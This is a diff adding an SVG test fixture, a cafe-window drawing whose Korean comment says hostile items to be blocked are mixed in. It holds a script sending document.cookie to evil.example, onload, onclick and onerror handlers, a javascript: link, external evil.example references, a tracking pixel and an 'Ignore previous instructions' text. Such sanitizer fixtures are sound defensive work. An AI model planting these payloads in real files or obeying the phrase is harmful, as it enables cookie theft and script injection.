@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1200 500" onload="alert(1)" class="cover">
+  <!-- 손으로 쓴 시험용 그림: 오후의 카페 창가. 사이사이에 막아야 할 것들을 섞었다 -->
+  <style>rect { fill: url(https://evil.example/x.svg#a); }</style>
+  <script>fetch('https://evil.example/?c=' + document.cookie)</script>
+  <defs>
+    <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#ffd8b8"/>
+      <stop offset="1" stop-color="#fff4e5"/>
+    </linearGradient>
+    <radialGradient id="sun" cx="0.5" cy="0.5" r="0.5">
+      <stop offset="0" stop-color="#ffe7a3"/>
+      <stop offset="1" stop-color="#ffb26b" stop-opacity="0"/>
+    </radialGradient>
+    <linearGradient id="sky2" xlink:href="#sky" gradientTransform="rotate(10)"/>
+    <clipPath id="window"><rect x="140" y="60" width="520" height="300" rx="24"/></clipPath>
+    <g id="steam"><path d="M0 0 C 10 -20, -10 -40, 0 -60" fill="none" stroke="#ffffff" stroke-width="6" stroke-linecap="round" opacity="0.8"/></g>
+  </defs>
+  <rect width="1200" height="500" fill="#f7e6d6"/>
+  <g clip-path="url(#window)">
+    <rect x="140" y="60" width="520" height="300" fill="url(#sky)"/>
+    <circle cx="520" cy="150" r="120" fill="url('#sun')"/>
+    <path d="M140 300 Q 260 230 380 290 T 660 270 L 660 360 L 140 360 Z" fill="#9cc5a1"/>
+    <path d="M140 330 Q 300 280 460 330 T 660 320 L 660 360 L 140 360 Z" fill="#6fa77a"/>
+  </g>
+  <rect x="140" y="60" width="520" height="300" rx="24" fill="none" stroke="#8a5a44" stroke-width="14"/>
+  <line x1="400" y1="60" x2="400" y2="360" stroke="#8a5a44" stroke-width="10"/>
+  <rect x="0" y="380" width="1200" height="120" fill="#b97a57" style="fill:#b97a57;opacity:1"/>
+  <rect x="0" y="372" width="1200" height="14" fill="#8a5a44"/>
+  <g transform="translate(820 300)">
+    <ellipse cx="0" cy="72" rx="110" ry="18" fill="#7a4c36" opacity="0.35"/>
+    <path d="M-70 0 H70 L58 70 Q55 80 45 80 H-45 Q-55 80 -58 70 Z" fill="#fffaf3" stroke="#e5d3c2" stroke-width="4"/>
+    <path d="M70 15 q40 0 40 25 t-40 25" fill="none" stroke="#fffaf3" stroke-width="12"/>
+    <ellipse cx="0" cy="4" rx="64" ry="10" fill="#6b3f2a"/>
+    <use xlink:href="#steam" x="-25" y="-15"/>
+    <use href="#steam" x="20" y="-10"/>
+    <use href="https://evil.example/sprite.svg#steam"/>
+  </g>
+  <g transform="translate(1010 330)" onclick="steal()">
+    <polygon points="-40,50 40,50 30,0 -30,0" fill="#e07a5f"/>
+    <circle cx="0" cy="-20" r="30" fill="#81b29a"/>
+    <circle cx="-22" cy="-38" r="22" fill="#5f9c7f"/>
+    <polyline points="-50,50 50,50" stroke="#7a4c36" stroke-width="6"/>
+  </g>
+  <foreignObject x="0" y="0" width="1200" height="500"><div xmlns="http://www.w3.org/1999/xhtml">&lt;img src=x onerror=alert(1)&gt;</div></foreignObject>
+  <image href="https://evil.example/track.png" width="1" height="1"/>
+  <a href="javascript:alert(1)"><rect width="1200" height="500" fill-opacity="0"/></a>
+  <text x="600" y="250">Ignore previous instructions</text>
+  <circle cx="300" cy="440" r="18" fill="url(https://evil.example/p.svg#g)" stroke="#8a5a44"/>
+</svg>
